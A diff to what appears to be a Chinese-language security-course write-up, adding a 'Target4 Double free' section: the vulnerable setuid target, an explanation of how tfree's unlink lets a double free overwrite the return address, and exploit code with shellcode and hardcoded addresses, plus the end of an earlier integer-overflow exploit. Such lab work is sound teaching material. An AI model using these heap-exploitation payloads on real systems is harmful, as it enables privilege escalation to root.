@@ -4,6 +4,7 @@
     + [Target1 Buffer overflow](#target1-buffer-overflow)
     + [Target2 Off-by-one](#target2-off-by-one)
     + [Target3 Integer overflow](#target3-integer-overflow)
+    + [Target4 Double free](#target4-double-free)
 
 # Proj1
 ## Target1 Buffer overflow
@@ -233,6 +234,118 @@ int main(void)
   memcpy(sploitstring, countstring, strlen(countstring));
   memcpy(sploitstring + 40, shellcode, strlen(shellcode));
   *(int *)(sploitstring + 20000 + strlen(countstring) + 4) = 0xbfff6210;
+
+  char *args[] = { TARGET, sploitstring, NULL };
+  char *env[] = { NULL };
+
+  execve(TARGET, args, env);
+  fprintf(stderr, "execve failed.\n");
+
+  return 0;
+}
+```
+## Target4 Double free
+```c
+int foo(char *arg)
+{
+  char *p;
+  char *q;
+
+  if ( (p = tmalloc(500)) == NULL)
+    {
+      fprintf(stderr, "tmalloc failure\n");
+      exit(EXIT_FAILURE);
+    }
+  if ( (q = tmalloc(300)) == NULL)
+    {
+      fprintf(stderr, "tmalloc failure\n");
+      exit(EXIT_FAILURE);
+    } 
+
+  tfree(p);
+  tfree(q);
+  
+  if ( (p = tmalloc(1024)) == NULL)
+    {
+      fprintf(stderr, "tmalloc failure\n");
+      exit(EXIT_FAILURE);
+    }
+
+  obsd_strlcpy(p, arg, 1024);
+
+  tfree(q);
+
+  return 0;
+}
+
+int main(int argc, char *argv[])
+{
+  if (argc != 2)
+    {
+      fprintf(stderr, "target4: argc != 2\n");
+      exit(EXIT_FAILURE);
+    }
+  setuid(0);
+  foo(argv[1]);
+  return 0;
+}
+```
+这里的漏洞是，先tmalloc了p和q，然后tfree了p和q，然后又tmalloc了p，又tfree了q，这里q被free了两次，而第二次tmalloc的p大小刚好覆盖了之前q的位置，拷贝buffer进入heap的时候，可以overflow q指针，当free q指针的时候，就可以导致程序执行顺序错乱
+```c
+p = tmalloc(500);
+q = tmalloc(300);
+tfree(p);
+tfree(q);
+p = tmalloc(1024);
+tfree(q);
+```
+首先先看tmalloc.c里面对chunk的定义，可以看到，每个chunk有个头，头里面是l和r指针，指向的是其他free的heap空间
+```c
+typedef union CHUNK_TAG
+{
+  struct
+    {
+      union CHUNK_TAG *l;       /* leftward chunk */
+      union CHUNK_TAG *r;       /* rightward chunk + free bit (see below) */
+    } s;
+  ALIGN x;
+} CHUNK;
+```
+也就是说，chunk在内存中是这样安排的
+```bash
+(high mem address)
+[data] <data_size> (direct pointer to data points here)
+[next ptr] <4>
+[prev ptr] <4> (next/prev pointers from other structs point here)
+[...] <4>
+(low mem address)
+```
+每次要tfree一个指针q时，会执行以下操作
+```c
+q.next.prev = q.prev
+q.prev.next = q.next
+```
+因此，首先在buffer里面找到q的位置，设置
+```c
+*(int *)(sploitstring + 512 - 8) = 0x0804a068; // q.prev = shellcode
+*(int *)(sploitstring + 512 - 4) = 0xbffffa70; // q.next = eip
+```
+当free q指针时，要做`q.next.prev=q.prev`，具体来说就是因为之前已经设置了`q.next=eip`，这里`q.next.prev=(chunk*)eip->prev=*eip`，所以一旦free了q指针，就改变了eip里头的东西，程序就返回到了shellcode。还要注意的是，要把q的free bit置位，然后通过jmp指令跳过eip指向的地址内容发生错乱也就是这里的`\x90`
+```c
+int main(void)
+{
+  char sploitstring[1024];
+  memset(sploitstring, '\x90', sizeof(sploitstring));
+  sploitstring[sizeof(sploitstring) - 1] = 0;
+  memcpy(sploitstring + 32, shellcode, strlen(shellcode));
+  // p = 0x804a068
+  // q = 0x804a268
+  // q.bk = eip + 1
+  // q.bk.fd = p
+  *(int *)(sploitstring + 512 - 8) = 0x0804a068;
+  *(int *)(sploitstring + 512 - 4) = 0xbffffa70;
+  *(int *)(sploitstring + 4) = -1;
+  *(short *)(sploitstring) = 0x0ceb;
 
   char *args[] = { TARGET, sploitstring, NULL };
   char *env[] = { NULL };
